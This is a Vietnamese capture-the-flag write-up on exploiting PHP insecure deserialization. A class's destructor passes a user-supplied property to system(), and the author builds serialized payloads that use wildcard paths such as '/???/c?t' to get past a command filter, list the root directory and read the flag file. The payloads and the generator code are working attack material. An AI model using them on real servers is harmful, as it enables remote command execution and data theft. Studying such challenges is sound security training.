Trước hết, khi nhìn vào source code của chương trình, ta thấy chương trình nhận vào một biến $_GET['payload'], challenge này thuộc dạng khai thác lỗ hổng Deserialize
nên ta sẽ truyền payload vào trong biến GET trên URL.

Nguyên văn class ban đầu của chương trình:

```PHP
class exploit_me
{
    public $cmd;
    public function __destruct(){
        system($this->cmd);
    }
}
```

Ta thấy để khai thác được lỗ hổng này thì ta cần truyền vào một biến cmd là câu lệnh sẽ được chạy trong hàm system của PHP

Nếu vậy thì đối với challenge này, ta sẽ cần đọc file flag.txt (dự đoán) đang nằm ở đâu đó trong hệ thống file của máy chủ chạy trang web này

Ta sẽ thử với payload như sau:

```
O:10:"exploit_me":1:{s:3:"cmd";s:2:"ls";}
```
Ta thấy đối với payload này, trang web không trả về kết quả nào, do trang web và hệ thống host đã có cơ chế chống thực thi trong webshell

Để bypass trường hợp này, ta cần sử dụng các ký tự đặc biệt cũng như các payload đặc biệt.

Ta sẽ thực hiện list tất cả các file nằm ở thư mục / (root) của hệ thống bằng payload:

```
O:10:%22exploit_me%22:1:%7Bs:3:%22cmd%22;s:10:%22/???/d?r%20/%22;%7D
```

Như vậy ta thấy hệ thống file được hiển thị ra, ta cần nội dung file ```a8749209e3d652e_flag```, do đó ta sẽ đổi payload sang:

```
O:10:"exploit_me":1:{s:3:"cmd";s:30:"/???/c?t /a8749209e3d652e_flag";}
```

Code PHP tạo payload:

```PHP
class exploit_me
{
    public $cmd = "/???/c?t /a8749209e3d652e_flag";
    public function __destruct(){
        system($this->cmd);
    }
}
```



